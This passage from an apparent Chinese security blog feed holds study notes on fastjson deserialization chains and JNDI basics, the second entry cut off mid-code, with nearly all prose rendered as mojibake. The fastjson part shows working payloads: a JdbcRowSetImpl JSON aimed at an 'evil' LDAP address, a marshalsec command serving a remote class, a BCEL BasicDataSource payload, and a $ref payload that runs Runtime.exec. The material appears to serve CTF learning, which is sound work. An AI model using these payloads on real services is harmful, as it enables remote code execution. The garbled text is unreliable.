setAutoCommit(var1);<br>&#125;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å½“<code>conn == null</code>æ—¶ï¼Œè°ƒç”¨<code>connect()</code>:</p><p><img src="/2024/08/01/fastjson/image-20240801215837593.png" alt="image-20240801215837593"></p><p>ç»å…¸çš„<code>(new InitialContext()).lookup()</code>ï¼Œé‚£ä¹ˆåªè¦dataSourceNameè®¾ä¸ºæ¶æ„è¿œç¨‹RMIæœåŠ¡æˆ–ldapæœåŠ¡å³å¯ã€‚</p><blockquote><p>{</p><p> â€œ@typeâ€:â€com.sun.rowset.JdbcRowSetImplâ€,</p><p> â€œdataSourceNameâ€:â€ldap:&#x2F;&#x2F;127.0.0.1:8099&#x2F;evilâ€,</p><p> â€œautoCommitâ€:true</p><p>}</p></blockquote><p>å¯ä»¥åˆ©ç”¨marshalsecå¼€å¯ldapæœåŠ¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java -cp .\marshalsec-<span class="hljs-number">0.0</span><span class="hljs-number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="hljs-comment">//127.0.0.1:8000/#calc 8099</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/01/fastjson/image-20240801220859119.png" alt="image-20240801220859119"></p><h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><p>fastjsonç½‘ä¼ çš„ä¸‰æ¡åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š</p><ul><li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li><li><code>com.sun.rowset.JdbcRowSetImpl</code></li><li><code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></li></ul><p>å‰é¢ä¸¤ä¸ªå·²ç»ä»‹ç»ï¼Œç°åœ¨è¿˜å‰©æœ€åä¸€ä¸ª<code>BasicDataSource</code>ã€‚</p><ol><li>å¸¸è§„çš„Javaå­—èŠ‚ç çš„æ‰§è¡Œï¼Œä½†æ˜¯éœ€è¦å¼€å¯<code>Feature.SupportNonPublicField</code>ï¼Œè¾ƒé¸¡è‚‹</li><li>åˆ©ç”¨JNDIæ³¨å…¥ï¼Œä½†éœ€è¦æœåŠ¡å™¨å‡ºç½‘</li><li>ä¸ç”¨å‡ºç½‘ä¹Ÿä¸ç”¨å¼€å¯<code>Feature.SupportNonPublicField</code></li><li>ä¾èµ–å¦‚ä¸‹</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.45<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>è°ƒç”¨é“¾ï¼š</strong></p><p><code>getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()-&gt;createDriver()</code></p><p><img src="/2024/08/01/fastjson/image-20240801222516262.png" alt="image-20240801222516262"></p><p><code>Class.forName</code>ç¬¬äºŒä¸ªå‚æ•°<code>initial</code>ä¸ºtrueæ—¶ï¼Œç±»åŠ è½½åå°†ä¼šç›´æ¥æ‰§è¡Œ<code>static&#123;&#125;</code>å—ä¸­çš„ä»£ç ã€‚</p><p><code>driverClassLoader</code>å’Œ<code>driverClassName</code>éƒ½å¯ä»¥é€šè¿‡fastjsonæ§åˆ¶</p><blockquote><p>{</p><p> {</p><p> â€œaaaâ€: {</p><p> â€œ@typeâ€: â€œorg.apache.tomcat.dbcp.dbcp2.BasicDataSourceâ€,</p><p> â€œdriverClassLoaderâ€: {</p><p> â€œ@typeâ€: â€œcom.sun.org.apache.bcel.internal.util.ClassLoaderâ€</p><p> },</p><p> â€œdriverClassNameâ€: â€œ$$BCEL$$$l$8b$I$A$â€¦â€</p><p> }</p><p> }: â€œbbbâ€</p><p>}</p></blockquote><p><img src="/2024/08/01/fastjson/image-20240801222607739.png" alt="image-20240801222607739"></p><p>å®é™…ä¸Šé¢çš„getConnectionä¸æ»¡è¶³fastjsonå¯¹è‡ªåŠ¨è°ƒç”¨getterçš„è¦æ±‚ï¼Œå‰é¢è¯´è¿‡ï¼š</p><blockquote><p>æ»¡è¶³æ¡ä»¶çš„getterï¼š</p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€æ–¹æ³•</li><li>ä»¥getå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>æ— å‚æ•°</li><li>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicInteger</li></ul></blockquote><p>åœ¨<code>&#123;&quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;â€¦â€¦&#125;</code> è¿™ä¸€æ•´æ®µå¤–é¢å†å¥—ä¸€å±‚<code>&#123;&#125;</code>ï¼Œè¿™æ ·çš„è¯ä¼šæŠŠè¿™ä¸ªæ•´ä½“å½“åšä¸€ä¸ªJSONObjectï¼Œä¼šæŠŠè¿™ä¸ªå½“åškeyï¼Œå€¼ä¸ºbbb</p><p>å°†è¿™ä¸ª JSONObject æ”¾åœ¨ JSON Key çš„ä½ç½®ä¸Šï¼Œåœ¨ JSON ååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒFastJson ä¼šå¯¹ JSON Key è‡ªåŠ¨è°ƒç”¨ toString() æ–¹æ³•ï¼ˆå› ä¸ºkeyä¸€å®šè¦æ˜¯Stringç±»å‹ï¼‰</p><p>è€Œä¸”JSONObjectæ˜¯Mapçš„å­ç±»ï¼Œå½“è°ƒç”¨<code>toString</code>çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨è¯¥ç±»çš„getteræ–¹æ³•è·å–å€¼ã€‚æ‰€ä»¥ä¼šè°ƒç”¨åˆ°<code>getConnection</code>æ–¹æ³•ã€‚</p><p><img src="/2024/08/01/fastjson/image-20240801222706621.png" alt="image-20240801222706621"></p><p>å½“fastjson&gt;&#x3D;1.2.36çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨<code>$ref</code>æ–¹å¼è°ƒç”¨getterã€‚</p><p>refæ˜¯fastjsonç‰¹æœ‰çš„JSONPathè¯­æ³•ï¼Œç”¨æ¥å¼•ç”¨ä¹‹å‰å‡ºç°çš„å¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">private</span> String cmd;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCmd</span><span class="hljs-params">(String cmd)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;seter call&quot;</span>);<br>        <span class="hljs-built_in">this</span>.cmd = cmd;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCmd</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;geter call&quot;</span>);<br>        Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ref_fastjson.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ref_fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[&#123;\&quot;@type\&quot;:\&quot;com.demo.fastjson.test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åŸç”Ÿååºåˆ—åŒ–"><a href="#åŸç”Ÿååºåˆ—åŒ–" class="headerlink" title="åŸç”Ÿååºåˆ—åŒ–"></a>åŸç”Ÿååºåˆ—åŒ–</h3><p>æ¥è‡ªY4ä½¬ï¼š</p><p><a href="https://paper.seebug.org/2055/">FastJson ä¸åŸç”Ÿååºåˆ—åŒ– (seebug.org)</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJsonä¸åŸç”Ÿååºåˆ—åŒ–(äºŒ) (y4tacker.github.io)</a></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ä¸ƒä¸ƒå…«å…«æŠ„äº†ä¸€äº›ï¼Œæ‰“æ¯”èµ›çš„æ—¶å€™é‡åˆ°fastjsonä¹ŸæŒºå¤šçš„ï¼Œå¤šå­¦ä¹ å­¦ä¹ ã€‚ä½†fastjsonä¹Ÿé€æ¸æ·¡å‡ºè§†é‡äº†ã€‚</p><p>ç°åœ¨java8çš„é¢˜å°†è¦æ­»å»ï¼Œå‡ºç°æ›´å¤šçš„java11ã€java17ï¼Œè¿™éƒ½æ˜¯æ–°çš„æŒ‘æˆ˜ï¼Œå› ä¸ºæ¶‰åŠåˆ°å…¨æ–°çš„æ€è·¯ä¸æ–¹æ³•ã€‚</p><p>ç°åœ¨æˆ‘åªä¸è¿‡æ˜¯æ²¿ç€å‰äººçš„é“è·¯ä¸€æ­¥æ­¥ç­‘åŸºç½¢äº†ã€‚</p><p>Jacksonè·Ÿfastjsonå¾ˆåƒï¼Œæ”¾åœ¨åé¢å†™ã€‚</p><p>ä»¥åŠæœ€åé™„ä¸Šsu18å¤§ä½¬çš„ï¼Œå¸¸çœ‹å¸¸æ–°ï¼š</p><p><a href="https://su18.org/post/fastjson/#%E4%B8%80-%E7%AE%80%E4%BB%8B">fastjsonï¼šæˆ‘ä¸€è·¯å‘åŒ—ï¼Œç¦»å¼€æœ‰ä½ çš„å­£èŠ‚ | ç´ åå…« (su18.org)</a></p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson">FastJson ğŸª | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI</title>
    <link href="/2024/07/30/JNDI/"/>
    <url>/2024/07/30/JNDI/</url>
    
    <content type="html"><![CDATA[<p>JNDIå®ƒç»ˆäºæ¥äº†ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¦–å…ˆä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯JNDIã€‚</p><p>JNDI(<code>Java Naming and Directory Interface</code>)ï¼šJavaå‘½åä¸ç›®å½•æ¥å£</p><p>æ ‡å‡†çš„Javaå‘½åç³»ç»Ÿæ¥å£ï¼ŒJNDIæä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯APIï¼Œé€šè¿‡ä¸åŒçš„è®¿é—®æä¾›è€…æ¥å£JNDIæœåŠ¡ä¾›åº”æ¥å£ï¼ˆSPIï¼‰çš„å®ç°ï¼Œç”±ç®¡ç†è€…å°†JNDI APIæ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•ç³»ç»Ÿï¼Œä½¿Javaåº”ç”¨ç¨‹åºèƒ½å’Œè¿™äº›å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ä¹‹é—´è¿›è¡Œäº¤äº’ã€‚</p><p>ç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„ä¸€ç§è‡ªç„¶æ‰©å±•ã€‚</p><p><strong>Naming Service å‘½åæœåŠ¡ï¼š</strong> æŠŠä¸€ä¸ªæœåŠ¡åç§°å’Œå¯¹è±¡æˆ–å‘½åå¼•ç”¨ç›¸å…³è”ã€‚åœ¨ä¸€äº›å‘½åæœåŠ¡ç³»ç»Ÿä¸­å¹¶ä¸ç›´æ¥å°†å¯¹è±¡è¿›è¡Œå­˜å‚¨ï¼Œè€Œæ˜¯å­˜å‚¨äº†å¯¹è±¡çš„å¼•ç”¨ï¼Œå¼•ç”¨åŒ…å«äº†å¦‚ä½•è®¿é—®å®é™…å¯¹è±¡çš„ä¿¡æ¯ï¼Œç±»ä¼¼äºæŒ‡é’ˆã€‚</p><ul><li><strong>Bindings</strong>: è¡¨ç¤ºä¸€ä¸ªåç§°å’Œå¯¹åº”å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼Œæ¯”å¦‚åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶åç»‘å®šåˆ°å¯¹åº”çš„æ–‡ä»¶ï¼Œåœ¨ DNS ä¸­åŸŸåç»‘å®šåˆ°å¯¹åº”çš„ IPã€‚</li><li><strong>Context</strong>: ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªä¸Šä¸‹æ–‡ä¸­å¯¹åº”ç€ä¸€ç»„åç§°åˆ°å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æŒ‡å®šä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾åç§°å¯¹åº”çš„å¯¹è±¡ã€‚æ¯”å¦‚åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªç›®å½•å°±æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œå¯ä»¥åœ¨è¯¥ç›®å½•ä¸­æŸ¥æ‰¾æ–‡ä»¶ï¼Œå…¶ä¸­å­ç›®å½•ä¹Ÿå¯ä»¥ç§°ä¸ºå­ä¸Šä¸‹æ–‡ (<code>subcontext</code>)ã€‚</li><li><strong>References</strong>: å½“å­˜åœ¨ä¸Šè¿°çš„ç‰¹æ®Šæƒ…å†µæ—¶ï¼Œä»¥å¼•ç”¨çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œå¯ä»¥ç†è§£ä¸ºæŒ‡é’ˆã€‚å¼•ç”¨ä¸­åŒ…å«äº†è·å–å®é™…å¯¹è±¡æ‰€éœ€çš„ä¿¡æ¯ï¼Œç”šè‡³å¯¹è±¡çš„å®é™…çŠ¶æ€ã€‚æ¯”å¦‚æ–‡ä»¶ç³»ç»Ÿä¸­å®é™…æ ¹æ®åç§°æ‰“å¼€çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªæ•´æ•° fd ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œå†…æ ¸æ ¹æ®è¿™ä¸ªå¼•ç”¨å€¼å»æ‰¾åˆ°ç£ç›˜ä¸­çš„å¯¹åº”ä½ç½®å’Œè¯»å†™åç§»ã€‚</li></ul><p><strong>Directory Service ç›®å½•æœåŠ¡ï¼š</strong> åœ¨å‘½ååŸºç¡€ä¸Šå¢åŠ äº†å±æ€§ï¼ˆæ–‡ä»¶ç›®å½•ä¸­æ¯ä¸ªæ–‡ä»¶å’Œç›®å½•éƒ½æœ‰å±æ€§ï¼šå¦‚åˆ›å»ºæ—¶é—´ã€è¯»å†™æ‰§è¡Œæƒé™ï¼‰ä¸ä»…å¯ä»¥æ ¹æ®åç§°å»æŸ¥æ‰¾(<strong>lookup</strong>)å¯¹è±¡(å¹¶è·å–å…¶å¯¹åº”å±æ€§)ï¼Œè¿˜å¯ä»¥æ ¹æ®å±æ€§å€¼å»æœç´¢(<strong>search</strong>)å¯¹è±¡ã€‚</p><p>åº”ç”¨é€šè¿‡JNDIä¸å…·ä½“çš„ç›®å½•æœåŠ¡è¿›è¡Œäº¤äº’ã€‚ä»è®¾è®¡ä¸Šï¼ŒJNDI ç‹¬ç«‹äºå…·ä½“çš„ç›®å½•æœåŠ¡å®ç°ï¼Œè®¾è®¡å‡ºäº†åº”ç”¨èŒƒå›´å®½æ³›çš„(ä¹Ÿå°±æ˜¯å…¼å®¹æ€§æ¯”è¾ƒå¼ºå¤§)ï¼Œå› æ­¤å¯ä»¥é’ˆå¯¹ä¸åŒçš„ç›®å½•æœåŠ¡æä¾›ç»Ÿä¸€çš„æ“ä½œæ¥å£ã€‚</p><p><img src="/2024/07/30/JNDI/image-20240730190919769.png" alt="image-20240730190919769"></p><p>SPI å…¨ç§°ä¸º Service Provider Interfaceï¼Œå³æœåŠ¡ä¾›åº”æ¥å£ï¼Œä¸»è¦ä½œç”¨æ˜¯<strong>ä¸ºåº•å±‚çš„å…·ä½“çš„ç›®å½•æœåŠ¡æä¾›ç»Ÿä¸€æ¥å£</strong>ï¼Œä»è€Œå®ç°ç›®å½•æœåŠ¡çš„å¯æ’æ‹”å¼å®‰è£…ã€‚åœ¨ JDK ä¸­åŒ…å«äº†ä¸‹è¿°å†…ç½®çš„ç›®å½•æœåŠ¡:</p><ul><li>RMIï¼šRemote Method Invocation è¿œç¨‹æ–¹æ³•è°ƒç”¨</li><li>LDAPï¼šLightweight Directory Access Protocol è½»é‡çº§ç›®å½•è®¿é—®åè®®</li><li>CORBAï¼šCommon Object Request Broker Architecture é€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†æ¶æ„</li></ul><p>åœ¨ Java JDK é‡Œé¢æä¾›äº†5ä¸ªåŒ…ï¼Œæä¾›ç»™JNDIçš„åŠŸèƒ½å®ç°ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·javax.namingï¼šä¸»è¦ç”¨äºå‘½åæ“ä½œ,åŒ…å«äº†è®¿é—®ç›®å½•æœåŠ¡æ‰€éœ€çš„ç±»å’Œæ¥å£ï¼Œæ¯”å¦‚ Contextã€Bindingsã€Referencesã€lookup ç­‰ã€‚<br><br>Â·javax.naming.directoryï¼šä¸»è¦ç”¨äºç›®å½•æ“ä½œï¼Œå®ƒå®šä¹‰äº†DirContextæ¥å£å’ŒInitialDir- Contextç±»ï¼›<br><br>Â·javax.naming.eventï¼šåœ¨å‘½åç›®å½•æœåŠ¡å™¨ä¸­è¯·æ±‚äº‹ä»¶é€šçŸ¥ï¼›<br><br>Â·javax.naming.ldapï¼šæä¾›LDAPæ”¯æŒï¼›<br><br>Â·javax.naming.spiï¼šå…è®¸åŠ¨æ€æ’å…¥ä¸åŒå®ç°ï¼Œä¸ºä¸åŒå‘½åç›®å½•æœåŠ¡ä¾›åº”å•†çš„å¼€å‘äººå‘˜æä¾›å¼€å‘å’Œå®ç°çš„é€”å¾„ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºé€šè¿‡JNDIå¯ä»¥è®¿é—®ç›¸å…³æœåŠ¡ã€‚<br></code></pre></td></tr></table></figure><h2 id="å…±æœ‰ç±»Common-Class"><a href="#å…±æœ‰ç±»Common-Class" class="headerlink" title="å…±æœ‰ç±»Common Class"></a>å…±æœ‰ç±»Common Class</h2><h3 id="InitialContextç±»"><a href="#InitialContextç±»" class="headerlink" title="InitialContextç±»:"></a><code>InitialContext</code>ç±»:</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">InitialContext() æ„å»ºä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ã€‚ <br><br>InitialContext(<span class="hljs-type">boolean</span> lazy) æ„é€ ä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå¹¶é€‰æ‹©ä¸åˆå§‹åŒ–å®ƒã€‚ <br><br>InitialContext(Hashtable environment) ä½¿ç”¨æä¾›çš„ç¯å¢ƒæ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ã€‚<br></code></pre></td></tr></table></figure><p>æ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå°±æ˜¯è·å–åˆå§‹ç›®å½•ç¯å¢ƒã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">bind(Name name, Object obj) å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ã€‚ <br>list(String name) æšä¸¾åœ¨å‘½åä¸Šä¸‹æ–‡ä¸­ç»‘å®šçš„åç§°ä»¥åŠç»‘å®šåˆ°å®ƒä»¬çš„å¯¹è±¡çš„ç±»åã€‚ <br>lookup(String name) æ£€ç´¢å‘½åå¯¹è±¡ã€‚ <br>rebind(String name, Object obj) å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ï¼Œè¦†ç›–ä»»ä½•ç°æœ‰ç»‘å®šã€‚ <br>unbind(String name) å–æ¶ˆç»‘å®šå‘½åå¯¹è±¡ã€‚<br></code></pre></td></tr></table></figure><h3 id="Referencesç±»ï¼š"><a href="#Referencesç±»ï¼š" class="headerlink" title="Referencesç±»ï¼š"></a><code>References</code>ç±»ï¼š</h3><p>åœ¨å‘½å&#x2F;ç›®å½•ç³»ç»Ÿå¤–éƒ¨æ‰¾åˆ°çš„å¯¹è±¡çš„å¼•ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡æ„é€ ä¸€ä¸ªæ–°çš„å¼•ç”¨ã€‚<br><br>Reference(String className, RefAddr addr)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡å’Œåœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚<br><br>Reference(String className, RefAddr addr, String factory, String factoryLocation)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ï¼Œå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®ä»¥åŠå¯¹è±¡çš„åœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚<br><br>Reference(String className, String factory, String factoryLocation)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ä»¥åŠå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚<br><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> posn, RefAddr addr)</span> å°†åœ°å€æ·»åŠ åˆ°ç´¢å¼•posnçš„åœ°å€åˆ—è¡¨ä¸­ã€‚<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(RefAddr addr)</span> å°†åœ°å€æ·»åŠ åˆ°åœ°å€åˆ—è¡¨çš„æœ«å°¾ã€‚<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> ä»æ­¤å¼•ç”¨ä¸­åˆ é™¤æ‰€æœ‰åœ°å€ã€‚<br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> æ£€ç´¢ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚<br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(String addrType)</span> æ£€ç´¢åœ°å€ç±»å‹ä¸ºâ€œaddrTypeâ€çš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚<br>Enumeration <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span> æ£€ç´¢æœ¬å‚è€ƒæ–‡çŒ®ä¸­åœ°å€çš„åˆ—ä¸¾ã€‚<br>String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> æ£€ç´¢å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„ç±»åã€‚<br>String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„å·¥å‚ä½ç½®ã€‚<br>String <span class="hljs-title function_">getFactoryClassName</span><span class="hljs-params">()</span> æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨å¯¹è±¡çš„å·¥å‚çš„ç±»åã€‚<br>Object <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> ä»åœ°å€åˆ—è¡¨ä¸­åˆ é™¤ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚<br><span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> æ£€ç´¢æ­¤å¼•ç”¨ä¸­çš„åœ°å€æ•°ã€‚<br>String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> ç”Ÿæˆæ­¤å¼•ç”¨çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jndi</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>; <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 